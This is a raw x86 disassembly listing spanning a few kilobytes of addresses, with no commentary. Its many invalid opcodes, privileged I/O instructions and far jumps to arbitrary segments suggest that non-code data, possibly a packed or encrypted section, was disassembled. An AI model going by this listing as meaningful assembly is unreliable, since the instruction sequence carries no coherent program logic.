  41dd7a:	cmp    BYTE PTR [edx+0x6],cl
  41dd7d:	je     0x41dd73
  41dd7f:	daa    
  41dd80:	mov    ds:0xeb364cbd,eax
  41dd85:	mov    dh,0x44
  41dd87:	fldcw  WORD PTR [ebx-0x68]
  41dd8a:	test   al,0xd5
  41dd8c:	jmp    eax
  41dd8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd8f:	retf   
  41dd90:	adc    dh,BYTE PTR [ebp+ebx*1+0x59227868]
  41dd97:	pop    ebx
  41dd98:	jmp    0xccf4:0x95036941
  41dd9f:	cmp    dl,ah
  41dda1:	push   0xcf2cbbea
  41dda6:	adc    eax,0xda904b0b
  41ddab:	into   
  41ddac:	sbb    edx,DWORD PTR ds:0xdceba9e0
  41ddb2:	push   eax
  41ddb3:	aaa    
  41ddb4:	outs   dx,DWORD PTR ds:[esi]
  41ddb5:	add    eax,DWORD PTR [esi-0x42175557]
  41ddbb:	inc    esp
  41ddbc:	mov    ds,edi
  41ddbe:	leave  
  41ddbf:	mov    dh,0xd8
  41ddc1:	repz pop edi
  41ddc3:	shl    dh,0x33
  41ddc6:	mov    bh,0xa6
  41ddc8:	fild   QWORD PTR [edi]
  41ddca:	rol    edi,cl
  41ddcc:	cwde   
  41ddcd:	pop    esp
  41ddce:	sub    esi,DWORD PTR [eax]
  41ddd0:	xchg   esp,eax
  41ddd1:	fild   WORD PTR [eax-0x75]
  41ddd4:	xor    eax,0x9061286c
  41ddd9:	fcomi  st,st(5)
  41dddb:	pop    ebp
  41dddc:	ins    BYTE PTR es:[edi],dx
  41dddd:	(bad)  
  41dddf:	push   edx
  41dde0:	xor    al,0xdc
  41dde2:	lds    ebp,FWORD PTR [ecx-0x2f]
  41dde5:	(bad)  
  41dde6:	stos   DWORD PTR es:[edi],eax
  41dde7:	sbb    al,0x91
  41dde9:	fbstp  TBYTE PTR [edi]
  41ddeb:	dec    eax
  41ddec:	shr    ecx,cl
  41ddee:	inc    ebx
  41ddef:	mov    bh,0xab
  41ddf1:	aam    0x28
  41ddf3:	imul   ebp,ebp,0x21
  41ddf6:	or     BYTE PTR [ecx-0x52c2d750],dl
  41ddfc:	push   ebp
  41ddfd:	xor    al,0x63
  41ddff:	push   ebx
  41de00:	and    bl,bh
  41de02:	inc    ebx
  41de03:	and    bl,dh
  41de05:	or     ebx,0x7b
  41de08:	and    cl,0xfc
  41de0b:	cmp    esp,DWORD PTR [ebp+ebx*1-0x10]
  41de0f:	adc    eax,0xc857e689
  41de14:	adc    eax,ebx
  41de16:	data16 lods al,BYTE PTR cs:[esi]
  41de19:	not    dh
  41de1b:	pop    ds
  41de1c:	hlt    
  41de1d:	(bad)  
  41de1e:	retf   
  41de1f:	push   0xb4efdf0a
  41de24:	shl    BYTE PTR [ecx-0x62],0x20
  41de28:	js     0x41de03
  41de2a:	(bad)  
  41de2b:	inc    DWORD PTR [ebp+0x6bb457ca]
  41de31:	das    
  41de32:	ins    BYTE PTR es:[edi],dx
  41de33:	cmp    ah,BYTE PTR [ecx-0x37]
  41de36:	cld    
  41de37:	adc    DWORD PTR [ebx],ebx
  41de39:	fwait
  41de3a:	repnz data16 cld 
  41de3d:	add    ah,al
  41de3f:	(bad)  
  41de40:	iret   
  41de41:	(bad)  
  41de42:	pop    ds
  41de43:	aam    0xad
  41de45:	pusha  
  41de46:	jg     0x41dec3
  41de48:	out    0xc0,al
  41de4a:	lods   eax,DWORD PTR ds:[esi]
  41de4b:	div    eax
  41de4d:	xchg   DWORD PTR [eax+ecx*2],esi
  41de50:	jns    0x41de77
  41de52:	dec    edx
  41de53:	push   edx
  41de54:	iret   
  41de55:	fistp  QWORD PTR ds:0x27c6491f
  41de5b:	inc    esp
  41de5c:	sub    DWORD PTR [edx-0xc],esp
  41de5f:	or     al,0x18
  41de61:	xchg   DWORD PTR [ebx+0x4e6b3aa7],esp
  41de67:	lock inc edx
  41de69:	enter  0xefc0,0xba
  41de6d:	fist   WORD PTR [ebx+0x55]
  41de70:	and    DWORD PTR [edi+0x4c1f4caa],ebp
  41de76:	cld    
  41de77:	ds (bad) 
  41de79:	and    DWORD PTR [ecx+0x4],eax
  41de7c:	fdivr  DWORD PTR [esi+0x30]
  41de80:	iret   
  41de81:	fistp  WORD PTR [ecx-0x7]
  41de84:	mov    dh,0xd7
  41de86:	jmp    0xfd94b5e5
  41de8b:	add    ah,BYTE PTR [ebx-0x22]
  41de8e:	nop
  41de8f:	pop    ebp
  41de90:	or     DWORD PTR [esi+eax*8-0x42],esi
  41de94:	mov    eax,ds:0x610898b1
  41de99:	hlt    
  41de9a:	outs   dx,BYTE PTR ds:[esi]
  41de9b:	push   es
  41de9c:	inc    ecx
  41de9d:	leave  
  41de9e:	cld    
  41de9f:	jae    0x41df11
  41dea1:	test   al,0x14
  41dea3:	push   edx
  41dea4:	sahf   
  41dea5:	push   esp
  41dea6:	xor    cl,al
  41dea8:	call   0x2ccb:0x670f4370
  41deaf:	mov    ebx,ebp
  41deb1:	or     ecx,edx
  41deb3:	inc    esi
  41deb4:	cmp    esi,DWORD PTR [ebp-0x20757443]
  41deba:	inc    ebx
  41debb:	mov    ebp,0x39103796
  41dec0:	imul   ebx,ebp,0xfffffffb
  41dec3:	adc    bl,al
  41dec5:	or     esi,esp
  41dec7:	pop    ss
  41dec8:	imul   edx,DWORD PTR [edi-0x20e6bd22],0xffffffbe
  41decf:	push   esp
  41ded0:	cmp    al,0x54
  41ded2:	nop
  41ded3:	imul   edi,ebx,0x91c9fce9
  41ded9:	cmp    eax,0x61b471d9
  41dede:	aad    0xc7
  41dee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee1:	rcl    BYTE PTR [esi-0x34cc3992],0xac
  41dee8:	jmp    0x41deae
  41deea:	ret    0x39be
  41deed:	mov    edi,0xdf20ed62
  41def2:	adc    ah,0x32
  41def5:	mov    esp,0x1afa03a
  41defa:	std    
  41defb:	aam    0x1d
  41defd:	test   al,0x2d
  41deff:	pop    es
  41df00:	xchg   ecx,eax
  41df01:	retf   0xc80b
  41df04:	adc    dh,BYTE PTR [edx+0x1ffe2de8]
  41df0a:	mov    es,WORD PTR [esi]
  41df0c:	sbb    eax,0xd93b5d6a
  41df11:	fdivp  st(4),st
  41df13:	sub    al,0xf4
  41df15:	or     al,0x19
  41df17:	xor    BYTE PTR [edi],ch
  41df19:	sub    esi,DWORD PTR [eax-0x31]
  41df1c:	outs   dx,BYTE PTR ds:[esi]
  41df1d:	ins    DWORD PTR es:[edi],dx
  41df1e:	inc    ebx
  41df1f:	mov    gs,esp
  41df21:	cmp    ecx,DWORD PTR [esi+0x574a2000]
  41df27:	sbb    BYTE PTR [edx+0x471dfcb8],ch
  41df2d:	aas    
  41df2e:	fist   WORD PTR [eax]
  41df30:	outs   dx,DWORD PTR ds:[esi]
  41df31:	jmp    0xfe7a79a
  41df36:	inc    esi
  41df37:	jae    0x41deef
  41df39:	and    ebp,esi
  41df3b:	sub    eax,0x7649a4ea
  41df40:	test   BYTE PTR [ebp+0x3c],ch
  41df43:	add    cl,bh
  41df45:	xchg   ebx,eax
  41df46:	jne    0x41df10
  41df48:	mov    gs,WORD PTR [edi+0x6e]
  41df4b:	aas    
  41df4c:	mov    edi,DWORD PTR [esi+eax*2-0xd]
  41df50:	in     eax,dx
  41df51:	mov    bh,0x72
  41df53:	sub    dl,BYTE PTR ds:0x1e00b7ff
  41df59:	push   ds
  41df5a:	jg     0x41df24
  41df5c:	pop    ebp
  41df5d:	push   es
  41df5e:	push   ss
  41df5f:	rcr    BYTE PTR [edi],1
  41df61:	push   cs
  41df62:	or     BYTE PTR [ebx+ebp*8],dl
  41df65:	(bad)  
  41df66:	jmp    FWORD PTR [edx-0x47818e17]
  41df6c:	sbb    bh,0x5e
  41df6f:	jle    0x41dfa2
  41df71:	add    ebx,DWORD PTR [ecx+0x52]
  41df74:	push   ss
  41df75:	pop    es
  41df76:	out    0xe5,eax
  41df78:	in     eax,0xdf
  41df7a:	nop
  41df7b:	or     al,0x40
  41df7d:	bound  eax,QWORD PTR [eax]
  41df7f:	mov    ch,0x2
  41df81:	jmp    0xabd7cee1
  41df86:	aad    0xc7
  41df88:	cmp    dh,ah
  41df8a:	pop    eax
  41df8b:	mov    bl,BYTE PTR [edi+0x6]
  41df8e:	xor    esp,edi
  41df90:	popa   
  41df91:	fst    DWORD PTR ds:0xfe075d9
  41df97:	imul   edi,DWORD PTR [ebx],0xce8db909
  41df9d:	(bad)  
  41df9f:	leave  
  41dfa0:	mov    ds:0xd6ed5640,eax
  41dfa5:	push   ds
  41dfa6:	std    
  41dfa7:	mov    eax,ds:0xa5dc8921
  41dfac:	fcom   QWORD PTR [esi+ebx*8]
  41dfaf:	sbb    esi,ebp
  41dfb1:	fbstp  TBYTE PTR [edi]
  41dfb3:	leave  
  41dfb4:	push   ebx
  41dfb5:	ret    
  41dfb6:	scas   al,BYTE PTR es:[edi]
  41dfb7:	mov    esp,0x9afd6940
  41dfbc:	adc    eax,0xfe67a62f
  41dfc1:	push   cs
  41dfc2:	dec    ebp
  41dfc3:	enter  0xa062,0xe9
  41dfc7:	dec    ebp
  41dfc8:	(bad)
  41dfcb:	jae    0x41dfb8
  41dfcd:	mov    ?,ebp
  41dfcf:	dec    ecx
  41dfd0:	mov    dl,BYTE PTR [ebx-0x34f66456]
  41dfd6:	ja     0x41dfa0
  41dfd8:	push   ss
  41dfd9:	and    eax,0xceaa32e
  41dfde:	(bad)  
  41dfdf:	popf   
  41dfe0:	inc    BYTE PTR [edx-0x1254726f]
  41dfe6:	sbb    eax,DWORD PTR [ebp+0x3d]
  41dfe9:	push   ebx
  41dfea:	je     0x41dfb7
  41dfec:	jne    0x41df6f
  41dfee:	cld    
  41dfef:	mov    cl,0x23
  41dff1:	sub    eax,0xdc2a25ad
  41dff6:	cld    
  41dff7:	pop    esp
  41dff8:	fsubr  DWORD PTR [ebp+0x1a]
  41dffb:	test   DWORD PTR [ebx+0x32],eax
  41dffe:	cmp    ecx,eax
  41e000:	xchg   edx,eax
  41e001:	fucom  st(6)
  41e003:	std    
  41e004:	loopne 0x41e01a
  41e006:	xchg   ecx,eax
  41e007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e008:	jmp    0x41df8d
  41e00a:	xchg   ebp,eax
  41e00b:	pop    edi
  41e00c:	xor    DWORD PTR [edx+0x4624a60],ebp
  41e012:	push   ss
  41e013:	mov    bh,BYTE PTR [ebp+0x0]
  41e016:	jmp    0xfe42:0xfded0c12
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	out    dx,al
  41e01f:	adc    ebx,edi
  41e021:	inc    ebx
  41e022:	in     eax,0x21
  41e024:	stos   BYTE PTR es:[edi],al
  41e025:	fistp  WORD PTR [ebx-0x15]
  41e028:	mov    dl,0x7a
  41e02a:	add    BYTE PTR [eax+0x4],bl
  41e02d:	loopne 0x41e06c
  41e02f:	or     BYTE PTR [eax],cl
  41e031:	out    0xb4,eax
  41e033:	call   DWORD PTR [esi+0x291efd73]
  41e039:	aaa    
  41e03a:	push   ds
  41e03b:	ins    DWORD PTR es:[edi],dx
  41e03c:	mov    ebp,0x81c8af5b
  41e041:	mov    al,0xec
  41e043:	push   0x16
  41e045:	popa   
  41e046:	test   al,0xa8
  41e048:	in     al,dx
  41e049:	jle    0x41dff1
  41e04b:	xchg   DWORD PTR ds:0x7baf44e,esp
  41e051:	inc    ecx
  41e052:	jle    0x41e019
  41e054:	enter  0xdc5a,0x6a
  41e058:	pop    es
  41e059:	pop    ds
  41e05a:	call   0xfcf59c41
  41e05f:	xchg   ecx,eax
  41e060:	jmp    0x82e2:0x7b9e96b9
  41e067:	enter  0xc35e,0xcc
  41e06b:	adc    DWORD PTR [ebx],ebp
  41e06d:	retf   
  41e06e:	aas    
  41e06f:	sbb    ebp,ebx
  41e071:	jge    0x41e095
  41e073:	outs   dx,DWORD PTR ds:[esi]
  41e074:	mov    ds:0xda282aab,al
  41e079:	add    al,0x62
  41e07b:	shr    BYTE PTR [ebx+0x15],cl
  41e07e:	in     al,dx
  41e07f:	les    edx,FWORD PTR ds:0xeb2689ac
  41e085:	addr16 test al,0x75
  41e088:	lods   al,BYTE PTR ds:[esi]
  41e089:	test   al,0x4e
  41e08b:	sbb    ebx,DWORD PTR [edi-0x21]
  41e08e:	lods   eax,DWORD PTR ds:[esi]
  41e08f:	fiadd  WORD PTR [ecx+0x1d5fa0f0]
  41e095:	fldcw  WORD PTR [ebx]
  41e097:	jnp    0x41e084
  41e099:	mov    bh,0xf6
  41e09b:	pusha  
  41e09c:	iret   
  41e09d:	popa   
  41e09e:	out    dx,al
  41e09f:	scas   al,BYTE PTR es:[edi]
  41e0a0:	loop   0x41e081
  41e0a2:	or     DWORD PTR [ebp+0x3f34bb24],0x21fd85af
  41e0ac:	ficomp WORD PTR [edi+edi*4]
  41e0af:	sbb    ah,bh
  41e0b1:	push   es
  41e0b2:	clc    
  41e0b3:	(bad)  
  41e0b4:	dec    eax
  41e0b5:	pushf  
  41e0b6:	stc    
  41e0b7:	lods   al,BYTE PTR ds:[esi]
  41e0b8:	retf   
  41e0b9:	iret   
  41e0ba:	jp     0x41e0e7
  41e0bc:	out    0xdc,al
  41e0be:	cld    
  41e0bf:	std    
  41e0c0:	in     al,dx
  41e0c1:	mov    bh,0xe3
  41e0c3:	ja     0x41e0dc
  41e0c5:	daa    
  41e0c6:	mov    edx,0x2e577ac8
  41e0cb:	and    al,0xe5
  41e0cd:	aas    
  41e0ce:	(bad)  
  41e0cf:	sbb    ebp,esi
  41e0d1:	outs   dx,BYTE PTR ds:[esi]
  41e0d2:	sbb    al,0xee
  41e0d4:	pop    eax
  41e0d5:	push   ds
  41e0d6:	jb     0x41e07d
  41e0d8:	je     0x41e150
  41e0da:	mov    eax,ds:0xdedf4e4b
  41e0df:	or     al,0xee
  41e0e1:	xchg   edi,eax
  41e0e2:	or     al,0x3
  41e0e4:	sbb    edi,esp
  41e0e6:	std    
  41e0e7:	fisub  DWORD PTR [eax+0x36e7da21]
  41e0ed:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41e0ef:	sti    
  41e0f0:	das    
  41e0f1:	fistp  WORD PTR [esp+ebx*8-0x5e5c895a]
  41e0f8:	and    al,BYTE PTR [edi+edi*8]
  41e0fb:	jg     0x41e17b
  41e0fd:	lods   eax,DWORD PTR ds:[esi]
  41e0fe:	adc    ch,BYTE PTR [esi-0x31]
  41e101:	lahf   
  41e102:	int    0xcb
  41e104:	pop    ds
  41e105:	fild   WORD PTR [eax-0x77]
  41e108:	and    al,0x49
  41e10a:	setp   BYTE PTR [edx-0x1]
  41e10e:	cld    
  41e10f:	or     dh,bl
  41e111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e112:	(bad)  
  41e113:	mov    cl,0xb8
  41e115:	test   DWORD PTR [ebx],eax
  41e117:	enter  0xb7e5,0xf0
  41e11b:	(bad)  
  41e11c:	int3   
  41e11d:	sub    esi,DWORD PTR [edx+eax*4]
  41e120:	jmp    0x41e112
  41e122:	sbb    al,0x57
  41e124:	mov    bl,BYTE PTR [edi+0x33]
  41e127:	sar    BYTE PTR [esi-0x6fd3e521],cl
  41e12d:	(bad)  
  41e12e:	in     eax,0x83
  41e130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e131:	mov    bl,BYTE PTR [eax-0x696483f0]
  41e137:	mov    al,ds:0x3ae896eb
  41e13c:	shr    BYTE PTR [ebp-0x21ec2605],cl
  41e142:	mov    edx,0xef73f71
  41e147:	je     0x41e163
  41e149:	sbb    eax,eax
  41e14b:	fsubrp st(5),st
  41e14d:	fnstenv [edi+0x16]
  41e150:	jg     0x41e1be
  41e152:	outs   dx,DWORD PTR ds:[esi]
  41e153:	retf   
  41e154:	lds    esp,FWORD PTR [eax-0x31]
  41e157:	test   BYTE PTR [ecx+edi*8-0x44],bl
  41e15b:	(bad)  
  41e15c:	icebp  
  41e15d:	push   ebx
  41e15e:	std    
  41e15f:	or     DWORD PTR [ebx-0x7b],edi
  41e162:	(bad)  
  41e163:	stos   BYTE PTR es:[edi],al
  41e164:	loopne 0x41e1be
  41e166:	pop    ebx
  41e167:	enter  0xf615,0xb6
  41e16b:	in     al,dx
  41e16c:	fst    QWORD PTR [edx+0x39ebbc7c]
  41e172:	push   ebp
  41e173:	ret    0x975a
  41e176:	cmp    BYTE PTR [esi],bh
  41e178:	repnz fld1 
  41e17b:	jecxz  0x41e100
  41e17d:	int    0x7c
  41e17f:	je     0x41e14c
  41e181:	inc    ebx
  41e182:	sub    DWORD PTR [ecx-0x14],ecx
  41e185:	lahf   
  41e186:	and    esp,esi
  41e188:	(bad)  
  41e189:	adc    BYTE PTR [edi-0x6b0c3384],bh
  41e18f:	jmp    0x41e129
  41e191:	les    ebp,FWORD PTR [eax+ecx*8]
  41e194:	(bad)  [edi+edx*1+0x2c4a39b9]
  41e19b:	fstp   DWORD PTR [eax+0x42ce0017]
  41e1a1:	and    eax,0x2fff7467
  41e1a6:	fist   WORD PTR [ebx+0x70d00646]
  41e1ac:	jmp    0x41e1ac
  41e1ae:	retf   
  41e1af:	jle    0x41e1ed
  41e1b1:	mul    DWORD PTR [eax+0x20c7eb82]
  41e1b7:	clc    
  41e1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1b9:	add    eax,0xdffc7304
  41e1be:	add    BYTE PTR [eax+0x33],0xa2
  41e1c2:	imul   ebp,DWORD PTR ds:0x4c98a3e8,0x21fd6123
  41e1cc:	xchg   ebp,eax
  41e1cd:	retf   
  41e1ce:	adc    al,BYTE PTR [ebx-0x37d1d1ab]
  41e1d4:	pop    ebp
  41e1d5:	cmp    ah,al
  41e1d7:	rol    DWORD PTR [ebp-0x120892b3],1
  41e1dd:	(bad)  [ecx]
  41e1df:	imul   ebp,DWORD PTR [ebx+0x26d1fd28],0x2f49c2ec
  41e1e9:	fist   WORD PTR [ecx+edi*8]
  41e1ec:	ror    esi,1
  41e1ee:	cmp    edx,ecx
  41e1f0:	pop    esp
  41e1f1:	loopne 0x41e1ef
  41e1f3:	mov    ?,WORD PTR [edx]
  41e1f5:	pop    es
  41e1f6:	mov    bl,BYTE PTR [eax+ebp*4-0x7]
  41e1fa:	mov    ebx,0x9cd9542a
  41e1ff:	adc    eax,0xaf3ca3bd
  41e204:	fcom   QWORD PTR [eax-0x41]
  41e207:	nop
  41e208:	jmp    0x41e23e
  41e20a:	jbe    0x41e1ff
  41e20c:	pop    es
  41e20d:	push   ecx
  41e20e:	fst    DWORD PTR [edi+0x7a]
  41e211:	fistp  WORD PTR [ebx+0x1b5c02c]
  41e217:	or     al,0x7c
  41e219:	add    BYTE PTR [ebp+0x5c81ff62],ah
  41e21f:	inc    ebx
  41e220:	stos   DWORD PTR es:[edi],eax
  41e221:	mov    ch,ah
  41e223:	add    DWORD PTR [ebx-0x50],esi
  41e226:	xlat   BYTE PTR ds:[ebx]
  41e227:	(bad)  
  41e228:	fisttp WORD PTR [eax-0x43]
  41e22b:	mov    ds:0x46e851a1,eax
  41e230:	jmp    0x41e26e
  41e232:	popf   
  41e233:	fld    DWORD PTR [ebx-0x1]
  41e236:	or     bh,BYTE PTR [eax+0x178e05a7]
  41e23c:	jmp    0x41e1d1
  41e23e:	leave  
  41e23f:	repnz push eax
  41e241:	leave  
  41e242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e243:	mov    bl,0xeb
  41e245:	mov    WORD PTR [eax],?
  41e247:	push   edx
  41e248:	jle    0x41e1f0
  41e24a:	in     eax,0xa0
  41e24c:	xchg   DWORD PTR [ebx-0x49],eax
  41e24f:	pushf  
  41e250:	xchg   edi,eax
  41e251:	jmp    0x6968f9e9
  41e256:	faddp  st(6),st
  41e258:	icebp  
  41e259:	pop    ecx
  41e25a:	dec    edi
  41e25b:	push   0xf88f8f7c
  41e260:	jmp    0x41e2d4
  41e262:	push   0x90e2957e
  41e267:	jl     0x41e24e
  41e269:	(bad)  
  41e26b:	and    ebx,DWORD PTR [eax]
  41e26d:	sbb    ch,BYTE PTR [esi]
  41e26f:	aam    0x24
  41e271:	mov    esp,0xce052ff
  41e276:	mov    cx,0x5791
  41e27a:	mov    cl,0xc6
  41e27c:	mov    bh,0xdf
  41e27e:	lds    ebp,FWORD PTR [edi+0x7bf2bb32]
  41e284:	sar    DWORD PTR [ebx-0x3],cl
  41e287:	popa   
  41e288:	nop
  41e289:	leave  
  41e28a:	ja     0x41e303
  41e28c:	repnz xor DWORD PTR [eax-0x38],ecx
  41e290:	loop   0x41e214
  41e292:	mov    ebp,0xf3edf57a
  41e297:	push   cs
  41e298:	jmp    0x41e27e
  41e29a:	cwde   
  41e29b:	ins    BYTE PTR es:[edi],dx
  41e29c:	in     eax,0x7
  41e29e:	or     al,BYTE PTR [ebp-0x4b]
  41e2a1:	loopne 0x41e28c
  41e2a3:	scas   eax,DWORD PTR es:[edi]
  41e2a4:	xlat   BYTE PTR ds:[ebx]
  41e2a5:	fnstenv [ebx]
  41e2a7:	test   eax,0x2871a1fc
  41e2ac:	and    esp,ebp
  41e2ae:	loope  0x41e24c
  41e2b0:	sub    esi,ebx
  41e2b2:	push   es
  41e2b3:	fs mov esi,0x2bd3de1c
  41e2b9:	gs sub cl,al
  41e2bc:	adc    eax,0xfc536b38
  41e2c1:	inc    edi
  41e2c2:	into   
  41e2c3:	mov    WORD PTR [ecx],fs
  41e2c5:	mov    ds:0x8773fcd4,eax
  41e2ca:	jecxz  0x41e312
  41e2cc:	imul   esp,DWORD PTR [eax+0x0],0x73
  41e2d0:	push   ds
  41e2d1:	xchg   esp,eax
  41e2d2:	int3   
  41e2d3:	test   DWORD PTR [ebp-0x5a],esp
  41e2d6:	mov    eax,0xdea1d9e6
  41e2db:	(bad)  
  41e2dc:	push   0x45
  41e2de:	jle    0x41e304
  41e2e0:	pop    esp
  41e2e1:	out    0xfc,eax
  41e2e3:	mov    bl,0x2b
  41e2e5:	jmp    0x41e302
  41e2e7:	test   al,0x82
  41e2e9:	mov    al,0xa
  41e2eb:	enter  0x14cb,0xe7
  41e2ef:	adc    eax,0x94cb93dc
  41e2f4:	push   DWORD PTR [ebx+0x2]
  41e2f7:	jmp    0x41e2e3
  41e2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2fa:	repnz add al,0xad
  41e2fd:	aas    
  41e2fe:	iret   
  41e2ff:	mov    cl,0xe9
  41e301:	stc    
  41e302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e303:	divps  xmm3,xmm7
  41e306:	call   0x984b:0xaebe23ef
  41e30d:	mov    ebp,?
  41e30f:	lahf   
  41e310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e311:	add    BYTE PTR [ebx],ch
  41e313:	add    esi,edi
  41e315:	pop    eax
  41e316:	(bad)  
  41e317:	shl    DWORD PTR [edi],cl
  41e319:	leave  
  41e31a:	cmp    eax,DWORD PTR [ebp+0x6e]
  41e31d:	jmp    0x41e2db
  41e31f:	cmp    eax,0xae1b7c89
  41e324:	pop    ebx
  41e325:	lods   eax,DWORD PTR ds:[esi]
  41e326:	cld    
  41e327:	outs   dx,DWORD PTR ds:[esi]
  41e328:	js     0x41e321
  41e32a:	fadd   DWORD PTR [esp+ecx*1-0x1c37b6ab]
  41e331:	pop    edi
  41e332:	stos   DWORD PTR es:[edi],eax
  41e333:	xor    al,0x3e
  41e335:	mov    al,0x29
  41e337:	mov    ds:0x41aab497,eax
  41e33c:	mov    ds:0x3afc4139,al
  41e341:	fnstcw WORD PTR [edi-0x19e02943]
  41e347:	adc    DWORD PTR [eax+ecx*4-0x2e],ecx
  41e34b:	jnp    0x41e359
  41e34d:	jge    0x41e394
  41e34f:	retf   0x61e6
  41e352:	icebp  
  41e353:	mov    edi,0x59f35fb5
  41e358:	sbb    DWORD PTR [edx],esi
  41e35a:	out    0x4,al
  41e35c:	xor    edi,ebx
  41e35e:	(bad)  
  41e35f:	push   eax
  41e360:	imul   eax,DWORD PTR [esp+ebp*2-0x672078e4],0xffffffa7
  41e368:	stos   BYTE PTR es:[edi],al
  41e369:	jnp    0x41e36a
  41e36b:	pop    ds
  41e36c:	push   cs
  41e36d:	inc    ecx
  41e36e:	std    
  41e36f:	and    ch,BYTE PTR [edi-0x35]
  41e372:	into   
  41e373:	bound  esi,QWORD PTR [ebp-0x55]
  41e376:	mov    eax,cs
  41e378:	enter  0xd235,0xdd
  41e37c:	or     al,0x5e
  41e37e:	ficomp WORD PTR [ebx+ebp*8-0x46]
  41e382:	in     eax,0xf2
  41e384:	cmp    eax,0x701e7970
  41e389:	(bad)  
  41e38b:	add    BYTE PTR [ebx+edi*2],0xf3
  41e38f:	(bad)  
  41e390:	mov    ds:0x7af5fd77,eax
  41e395:	add    BYTE PTR [ebx-0x4d9999c1],dl
  41e39b:	enter  0x284d,0x92
  41e39f:	jne    0x41e3f2
  41e3a1:	or     ah,BYTE PTR [ecx+edi*4-0x15]
  41e3a5:	stos   DWORD PTR es:[edi],eax
  41e3a6:	in     eax,0x5a
  41e3a8:	imul   esi,DWORD PTR [eax],0xf1746096
  41e3ae:	sbb    esp,eax
  41e3b0:	neg    ecx
  41e3b2:	enter  0x8bae,0x26
  41e3b6:	cmp    dh,bl
  41e3b8:	mov    al,ds:0xf54afcc6
  41e3bd:	and    BYTE PTR [edx-0x51c60f],dh
  41e3c3:	(bad)  
  41e3c4:	out    dx,al
  41e3c5:	sub    al,0x54
  41e3c7:	in     eax,dx
  41e3c8:	mov    dl,0xee
  41e3ca:	cmp    edi,DWORD PTR [ebp-0x62]
  41e3cd:	add    bh,ch
  41e3cf:	push   ss
  41e3d0:	or     eax,0x412d6088
  41e3d5:	(bad)  
  41e3d6:	sbb    al,cl
  41e3d8:	pop    ds
  41e3d9:	aad    0x28
  41e3db:	fsub   st(2),st
  41e3dd:	call   0xa076:0xeeebb2fb
  41e3e4:	stos   DWORD PTR es:[edi],eax
  41e3e5:	mov    ds:0xdf81bdb3,eax
  41e3ea:	fucom  st(2)
  41e3ec:	sbb    DWORD PTR [ebx+edi*4],esi
  41e3ef:	or     eax,0x702af740
  41e3f4:	frstor [eax]
  41e3f6:	rol    edi,1
  41e3f8:	dec    ecx
  41e3f9:	mov    dh,0x6b
  41e3fb:	cmp    al,0xf8
  41e3fd:	and    DWORD PTR [ecx],0x93e098c8
  41e403:	mov    ds:0x2bc66295,eax
  41e408:	(bad)  
  41e409:	loop   0x41e3b0
  41e40b:	shr    ch,0xd5
  41e40e:	ins    BYTE PTR es:[edi],dx
  41e40f:	cld    
  41e410:	and    ah,bl
  41e412:	xor    al,0x68
  41e414:	ins    BYTE PTR es:[edi],dx
  41e415:	sbb    BYTE PTR [ebx+0x7ff45148],dl
  41e41b:	xchg   edx,eax
  41e41c:	jmp    0x41e43a
  41e41e:	lods   eax,DWORD PTR ds:[esi]
  41e41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e420:	add    al,0x63
  41e422:	mov    cl,BYTE PTR [esp+ebx*2+0x3d8fdadc]
  41e429:	xor    bh,bl
  41e42b:	xor    BYTE PTR [ebx],bh
  41e42d:	test   al,0xfd
  41e42f:	and    al,0xde
  41e431:	jae    0x41e461
  41e433:	enter  0x70aa,0x28
  41e437:	ds push eax
  41e439:	or     bp,WORD PTR [esi+eax*1]
  41e43d:	shl    BYTE PTR [edi-0x67e9da38],1
  41e443:	and    al,0x57
  41e445:	push   esi
  41e446:	jg     0x41e407
  41e448:	jmp    0x41e4b1
  41e44a:	ins    DWORD PTR es:[edi],dx
  41e44b:	sbb    ch,BYTE PTR ds:0xf6f278b9
  41e451:	or     dh,bh
  41e453:	mov    cl,0x6b
  41e455:	mov    bh,ah
  41e457:	mov    bl,0x93
  41e459:	fsub   st,st(1)
  41e45b:	dec    eax
  41e45c:	in     al,dx
  41e45d:	cwde   
  41e45e:	cdq    
  41e45f:	lods   al,BYTE PTR ds:[esi]
  41e460:	and    cl,al
  41e462:	pop    edx
  41e463:	ret    0x9c43
  41e466:	icebp  
  41e467:	mov    DWORD PTR [ecx-0x41],0x4e02e21e
  41e46e:	das    
  41e46f:	cmp    ch,bl
  41e471:	test   cl,ch
  41e473:	ror    BYTE PTR [ecx+ebx*1],1
  41e476:	call   0x984b87f6
  41e47b:	mov    al,0x6b
  41e47d:	test   DWORD PTR [ecx+ebp*8],edx
  41e480:	shl    DWORD PTR [eax],1
  41e482:	or     DWORD PTR [edx-0x14],eax
  41e485:	call   0x40e2501b
  41e48a:	in     al,dx
  41e48b:	and    eax,0x1e801f2d
  41e490:	mov    edx,0xe22e0fdf
  41e495:	sub    esp,eax
  41e497:	mov    dh,0x69
  41e499:	retf   
  41e49a:	add    DWORD PTR [ebx+0x6afc993e],ebx
  41e4a0:	cdq    
  41e4a1:	scas   eax,DWORD PTR es:[edi]
  41e4a2:	cmp    dl,BYTE PTR [ebx+0xffadfc8]
  41e4a8:	jecxz  0x41e4aa
  41e4aa:	add    ecx,edi
  41e4ac:	xor    eax,0x50befd60
  41e4b1:	dec    ebp
  41e4b2:	pop    ecx
  41e4b3:	icebp  
  41e4b4:	fist   DWORD PTR [esi]
  41e4b6:	fwait
  41e4b7:	mov    WORD PTR [eax+0x3b],?
  41e4ba:	out    0x8a,eax
  41e4bc:	jmp    0x41e443
  41e4be:	call   0x9e2:0x112bbd22
  41e4c5:	outs   dx,BYTE PTR ds:[esi]
  41e4c6:	cli    
  41e4c7:	pusha  
  41e4c8:	inc    ebp
  41e4c9:	and    ebp,DWORD PTR [edi]
  41e4cb:	outs   dx,BYTE PTR ds:[esi]
